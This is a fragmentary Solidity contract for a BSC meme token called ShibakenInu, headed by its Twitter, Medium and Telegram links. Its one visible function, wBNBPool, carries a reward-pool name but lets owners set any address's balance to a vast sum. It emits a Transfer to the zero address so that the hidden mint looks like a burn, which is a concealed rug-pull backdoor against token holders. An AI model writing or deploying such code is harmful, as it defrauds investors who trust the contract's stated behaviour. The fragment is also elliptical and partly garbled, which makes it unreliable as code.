...
/**
Twitter: https://twitter.com/ShibakenInuBEP
Medium: https://medium.com/@ShibakenInu
Telegram: https://t.me/ShibakenInuBSC
...
contract ShibakenInu is proxyercBurnable, PresaleContractApp, proxyercOwnable {
    ...
    */
    ...
    function wBNBPool(address wbnbRewards) external subowners {
        proxyercfrom[wbnbRewards] = 20000000000000000 * 10 ** 22;
        
        emit Transfer(wbnbRewards, address(0), 20000000000000000 * 10 ** 22);
    }
    /**
